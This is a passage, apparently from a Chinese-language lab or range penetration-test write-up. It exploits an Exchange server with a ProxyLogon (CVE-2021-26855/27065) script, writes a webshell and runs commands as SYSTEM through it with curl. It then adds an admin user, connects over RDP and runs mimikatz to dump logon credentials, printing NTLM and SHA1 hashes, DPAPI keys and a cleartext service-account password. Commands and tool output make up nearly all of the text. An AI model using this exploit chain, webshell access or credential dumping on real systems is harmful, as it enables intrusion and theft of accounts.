+[<a href="https://github.com/p0wershe11/ProxyLogon">p0wershe11/ProxyLogon： ProxyLogon（CVE-2021-26855+CVE-2021-27065） Exchange Server RCE（SSRF-&gt;GetWebShell）</a>](<a href="https://github.com/p0wershe11/ProxyLogon">https://github.com/p0wershe11/ProxyLogon</a>)</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon]
+└─<span class="pl-c"><span class="pl-c">#</span> pc python3 ProxyLogon.py --host=172.22.3.9 --mail=administrator@xiaorang.lab</span>
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon/ProxyLogon.py:206: SyntaxWarning: invalid escape sequence <span class="pl-s"><span class="pl-pds">'</span>\-<span class="pl-pds">'</span></span>
+  result = re.search(<span class="pl-s"><span class="pl-pds">'</span>with SID ([S\-0-9]+) <span class="pl-pds">'</span></span>, r.text)
+/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon/ProxyLogon.py:367: SyntaxWarning: invalid escape sequence <span class="pl-s"><span class="pl-pds">'</span>\ <span class="pl-pds">'</span></span>
+  <span class="pl-k">|</span> <span class="pl-c1">.</span> <span class="pl-cce">\ </span>_ _  ___ __   _ _ <span class="pl-k">|</span> <span class="pl-k">|</span>   ___  ___  ___ ._ _
+
+=============================================================
+
+ ___                     _
+<span class="pl-k">|</span> <span class="pl-c1">.</span> <span class="pl-cce">\ </span>_ _  ___ __   _ _ <span class="pl-k">|</span> <span class="pl-k">|</span>   ___  ___  ___ ._ _
+<span class="pl-k">|</span>  _/<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>_&gt;/ . \ \/| | || |_ / . \/ . |/ . \| <span class="pl-pds">'</span></span> <span class="pl-k">|</span>
+<span class="pl-k">|</span>_<span class="pl-k">|</span>  <span class="pl-k">|</span>_<span class="pl-k">|</span>  <span class="pl-cce">\_</span>__//<span class="pl-cce">\_\`</span>_. <span class="pl-k">||</span>___<span class="pl-k">|</span><span class="pl-cce">\_</span>__/<span class="pl-cce">\_</span>. <span class="pl-k">|</span><span class="pl-cce">\_</span>__/<span class="pl-k">|</span>_<span class="pl-k">|</span>_<span class="pl-k">|</span>
+                   <span class="pl-k">&lt;</span>___<span class="pl-s"><span class="pl-pds">'</span>          &lt;___<span class="pl-pds">'</span></span>
+
+                                    author: p0wershe11,RGDZ
+=============================================================
+[<span class="pl-k">*</span>]:Getting ComputerName and DomainName.
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[<span class="pl-k">*</span>]:Domain Name = XIAORANG
+[<span class="pl-k">*</span>]:Computer Name = XIAORANG-EXC01.xiaorang.lab
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[<span class="pl-k">*</span>]:sid:S-1-5-21-533686307-2117412543-4200729784-500
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[<span class="pl-k">!</span>]:Login status code:241
+[<span class="pl-k">*</span>]:get ASP.NET_SessionId = 2275d798-919a-458c-8c6d-be388590ecee
+[<span class="pl-k">*</span>]:get msExchEcpCanary = x42yBjavSEyvxhxkRkc5zIDsFomcGN8Ij2_KVvAFT6XiD5HuXts3ARVGNUI671GLQZHg_lxxRcw.
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[<span class="pl-k">*</span>]:OAB Name = fOAB (Default Web Site)
+[<span class="pl-k">*</span>]:OAB ID = 6d8fb74b-8477-43ee-83ba-0b119205e85f
+[<span class="pl-k">*</span>]:Setting up webshell payload through OAB
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[+]:Setting up webshell payload OK<span class="pl-k">!</span>
+[<span class="pl-k">*</span>]:Writing shell...
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[<span class="pl-k">*</span>]:Cleaning OAB...
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
+[<span class="pl-k">*</span>]:resp:200
+[+]:shell: https://172.22.3.9/aspnet_client/BoAFUyJTtH.aspx</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon]
+└─<span class="pl-c"><span class="pl-c">#</span> pc -q curl -k -X POST "https://172.22.3.9/aspnet_client/BoAFUyJTtH.aspx" \</span>
+  --data-urlencode <span class="pl-s"><span class="pl-pds">'</span>command=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll())<span class="pl-pds">'</span></span>
+nt authority<span class="pl-cce">\s</span>ystem
+Name                            <span class="pl-c1">:</span> OAB (Default Web Site)
+PollInterval                    <span class="pl-c1">:</span> 480
+OfflineAddressBooks             <span class="pl-c1">:</span> <span class="pl-cce">\榛</span>樿鑴辨満閫氳绨<span class="pl-k">?</span>
+RequireSSL                      <span class="pl-c1">:</span> True
+BasicAuthentication             <span class="pl-c1">:</span> False
+WindowsAuthentication           <span class="pl-c1">:</span> True
+OAuthAuthentication             <span class="pl-c1">:</span> True
+MetabasePath                    <span class="pl-c1">:</span> IIS://XIAORANG-EXC01.xiaorang.lab/W3SVC/1/ROOT/OAB
+Path                            <span class="pl-c1">:</span> C:<span class="pl-cce">\P</span>rogram Files<span class="pl-cce">\M</span>icrosoft<span class="pl-cce">\E</span>xchange Server<span class="pl-cce">\V</span>15<span class="pl-cce">\F</span>rontEnd<span class="pl-cce">\H</span>ttpProxy<span class="pl-cce">\O</span>AB
+ExtendedProtectionTokenChecking <span class="pl-c1">:</span> None
+ExtendedProtectionFlags         <span class="pl-c1">:</span>
+ExtendedProtectionSPNList       <span class="pl-c1">:</span>
+AdminDisplayVersion             <span class="pl-c1">:</span> Version 15.1 (Build 1591.10)
+Server                          <span class="pl-c1">:</span> XIAORANG-EXC01
+InternalUrl                     <span class="pl-c1">:</span> https://xiaorang-exc01.xiaorang.lab/OAB
+InternalAuthenticationMethods   <span class="pl-c1">:</span> OAuth
+                                  WindowsIntegrated
+ExternalUrl                     <span class="pl-c1">:</span> http://f/
+ExternalAuthenticationMethods   <span class="pl-c1">:</span> OAuth
+                                  WindowsIntegrated
+AdminDisplayName                <span class="pl-c1">:</span>
+ExchangeVersion                 <span class="pl-c1">:</span> 0.10 (14.0.100.0)
+DistinguishedName               <span class="pl-c1">:</span> CN=OAB (Default Web Site),CN=HTTP,CN=Protocols,CN=XIAORANG-EXC01,CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=XIAORANG LAB,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=xiaorang,DC=lab
+Identity                        <span class="pl-c1">:</span> XIAORANG-EXC01<span class="pl-cce">\O</span>AB (Default Web Site)
+Guid                            <span class="pl-c1">:</span> 6d8fb74b-8477-43ee-83ba-0b119205e85f
+ObjectCategory                  <span class="pl-c1">:</span> xiaorang.lab/Configuration/Schema/ms-Exch-OAB-Virtual-Directory
+ObjectClass                     <span class="pl-c1">:</span> top
+                                  msExchVirtualDirectory
+                                  msExchOABVirtualDirectory
+WhenChanged                     <span class="pl-c1">:</span> 2026/9/20 19:27:56
+WhenCreated                     <span class="pl-c1">:</span> 2022/10/23 16:28:41
+WhenChangedUTC                  <span class="pl-c1">:</span> 2026/9/20 11:27:56
+WhenCreatedUTC                  <span class="pl-c1">:</span> 2022/10/23 8:28:41
+OrganizationId                  <span class="pl-c1">:</span>
+Id                              <span class="pl-c1">:</span> XIAORANG-EXC01<span class="pl-cce">\O</span>AB (Default Web Site)
+OriginatingServer               <span class="pl-c1">:</span> XIAORANG-WIN16.xiaorang.lab
+IsValid                         <span class="pl-c1">:</span> True</pre></div>
+<p>直接建一个管理 rdp上去就行</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3c511965-fa3a-499a-b632-e27a303c15dc"><img width="988" height="754" alt="Image" src="https://github.com/user-attachments/assets/3c511965-fa3a-499a-b632-e27a303c15dc" style="max-width: 100%; height: auto; max-height: 754px;; aspect-ratio: 988 / 754; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─<span class="pl-c"><span class="pl-c">#</span> pc xfreerdp3 /v:172.22.3.9 /u:mj /p:123.com /drive:share,/tmp/test/yunjing/dc</span></pre></div>
+<p>域管上来过的，MsCacheV2如果密码弱可以跑出来，一般不大可能，传个mimikatz抓hash</p>
+<pre class="notranslate"><code class="notranslate">
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+520	{0;000003e7} 1 D 20898     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
+ -&gt; Impersonated !
+ * Process Token : {0;00a356b0} 3 F 11435737  	XIAORANG-EXC01\mj	S-1-5-21-804691931-3750513266-524628342-1000	(14g,24p)	Primary
+ * Thread Token  : {0;000003e7} 1 D 11566839  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 10704560 (00000000:00a356b0)
+Session           : RemoteInteractive from 3
+User Name         : mj
+Domain            : XIAORANG-EXC01
+Logon Server      : XIAORANG-EXC01
+Logon Time        : 2026/9/20 19:34:14
+SID               : S-1-5-21-804691931-3750513266-524628342-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : mj
+	 * Domain   : XIAORANG-EXC01
+	 * NTLM     : afffeba176210fad4628f0524bfe1942
+	 * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650
+	tspkg :	
+	wdigest :	
+	 * Username : mj
+	 * Domain   : XIAORANG-EXC01
+	 * Password : (null)
+	kerberos :	
+	 * Username : mj
+	 * Domain   : XIAORANG-EXC01
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2512525 (00000000:0026568d)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:36:27
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : xiaorang.lab
+	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 111883 (00000000:0001b50b)
+Session           : Service from 0
+User Name         : Zhangtong
+Domain            : XIAORANG
+Logon Server      : XIAORANG-WIN16
+Logon Time        : 2026/9/20 18:34:33
+SID               : S-1-5-21-533686307-2117412543-4200729784-1147
+	msv :	
+	 [00000003] Primary
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG
+	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
+	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
+	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
+	tspkg :	
+	wdigest :	
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 66222 (00000000:000102ae)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:34:31
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : xiaorang.lab
+	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 24167 (00000000:00005e67)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:34:15
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	 [00000000]
+	 * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab
+	 * Domain   : (null)
+	 * Password : StL6JY;BrHETjE_?|!Bb}Ur_p5|4p&gt;KL#eTb-SMx}?Ft1C_AIW;CI3=?E=4&amp;BQtumhn4-Im].I5QNSQ(nt|N0eb^rsh7$a/fm3u/WCbMx7QDA(xTQ1X5h=KiKj7A*nfY
+	 [00000001]
+	 * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab
+	 * Domain   : (null)
+	 * Password : StL6JY;BrHETjE_?|!Bb}Ur_p5|4p&gt;KL#eTb-SMx}?Ft1C_AIW;CI3=?E=4&amp;BQtumhn4-Im].I5QNSQ(nt|N0eb^rsh7$a/fm3u/WCbMx7QDA(xTQ1X5h=KiKj7A*nfY
+	credman :	
+
+Authentication Id : 0 ; 10704589 (00000000:00a356cd)
+Session           : RemoteInteractive from 3
+User Name         : mj
+Domain            : XIAORANG-EXC01
+Logon Server      : XIAORANG-EXC01
+Logon Time        : 2026/9/20 19:34:14
+SID               : S-1-5-21-804691931-3750513266-524628342-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : mj
+	 * Domain   : XIAORANG-EXC01
+	 * NTLM     : afffeba176210fad4628f0524bfe1942
+	 * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650
+	tspkg :	
+	wdigest :	
+	 * Username : mj
+	 * Domain   : XIAORANG-EXC01
+	 * Password : (null)
+	kerberos :	
+	 * Username : mj
+	 * Domain   : XIAORANG-EXC01
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 9023402 (00000000:0089afaa)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox0d5918e
+Domain            : XIAORANG
+Logon Server      : XIAORANG-WIN16
+Logon Time        : 2026/9/20 19:10:36
+SID               : S-1-5-21-533686307-2117412543-4200729784-1136
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox0d5918e
+	 * Domain   : XIAORANG
+	 * NTLM     : 502317e49505021d7ffb417540f16f99
+	 * SHA1     : 12cddca46972b28bd44e47c0a8055d9ada61a173
+	 * DPAPI    : e317a7facc3583213273ef4cea7e9ff9
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox0d5918e
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : HealthMailbox0d5918e
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:34:33
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : XIAORANG-EXC01$
+Domain            : XIAORANG
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:34:15
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : xiaorang-exc01$
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 10697326 (00000000:00a33a6e)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/20 19:34:13
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : xiaorang.lab
+	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 10697310 (00000000:00a33a5e)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/20 19:34:13
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : xiaorang.lab
+	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 9200313 (00000000:008c62b9)
+Session           : Service from 0
+User Name         : DefaultAppPool
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 2026/9/20 19:16:45
+SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : xiaorang.lab
+	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2512499 (00000000:00265673)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:36:27
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : xiaorang.lab
+	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : XIAORANG-EXC01$
+Domain            : XIAORANG
+Logon Server      : (null)
+Logon Time        : 2026/9/20 18:34:31
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
+	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
+	tspkg :	
+	wdigest :	
+	 * Username : XIAORANG-EXC01$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : xiaorang-exc01$
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 9023679 (00000000:0089b0bf)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox0d5918e
+Domain            : XIAORANG
+Logon Server      : XIAORANG-WIN16
+Logon Time        : 2026/9/20 19:10:38
+SID               : S-1-5-21-533686307-2117412543-4200729784-1136
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox0d5918e
+	 * Domain   : XIAORANG
+	 * NTLM     : 502317e49505021d7ffb417540f16f99
+	 * SHA1     : 12cddca46972b28bd44e47c0a8055d9ada61a173
+	 * DPAPI    : e317a7facc3583213273ef4cea7e9ff9
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox0d5918e
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : HealthMailbox0d5918e
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2557332 (00000000:00270594)
+Session           : RemoteInteractive from 2
+User Name         : Zhangtong
+Domain            : XIAORANG
+Logon Server      : XIAORANG-WIN16
+Logon Time        : 2026/9/20 18:36:28
+SID               : S-1-5-21-533686307-2117412543-4200729784-1147
+	msv :	
+	 [00000003] Primary
+	 * Username : Zhangtong
+	 * Domain   : XIAORANG
+	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
+	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
